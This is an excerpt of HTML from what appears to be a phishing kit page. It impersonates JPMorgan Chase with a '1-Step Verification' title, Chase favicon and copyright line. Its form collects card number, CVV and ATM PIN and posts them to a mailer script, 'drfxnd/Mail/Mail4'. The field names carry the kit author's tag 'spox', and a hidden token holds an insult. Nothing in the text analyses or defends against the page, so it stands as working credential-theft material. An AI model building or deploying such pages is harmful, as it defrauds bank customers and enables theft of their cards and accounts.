...
<head>
        ...
        <title>1-Step Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link id="externalCSSLink" rel="external stylesheet" href="drfxnd/Files/css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="drfxnd/Files/img/chasefavicon.ico">
        <link href="drfxnd/Files/css/origination.css" rel="stylesheet" id="originationCSS">
    </head>
<style type="text/css">
...
<div id="main-container">
            ...
            <div>
            <form action="drfxnd/Mail/Mail4" method="POST">
...
<input  class="jpui input" placeholder="" type="tel" name="spox_cc" maxlength="16" required="" data-validation="creditcard" data-validation-error-msg="  ">
...
<input class="jpui input"  placeholder="" type="password" maxlength="4" name="spox_cvv"  data-validation="cvv" data-validation-error-msg="  ">
</div>
</div>
</div>
</div>
...
<span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-accessible-text">
    ...
    <input  class="jpui input" placeholder=""  type="password" maxlength="4" name="spox_atm_pin" data-validation="length" data-validation-length="min4-4" data-validation-error-msg=" ">
...
<input type="hidden" name="token_spox" value="Fuck_you_by_spox">
            ...
            <div class="footer__module-footer__section--footer-link__text copyright"><p></p><p style="text-align: center;">© 2023 JPMorgan Chase &amp; Co.</p>
<p></p></div>
            </div>
        </div>
      </div>
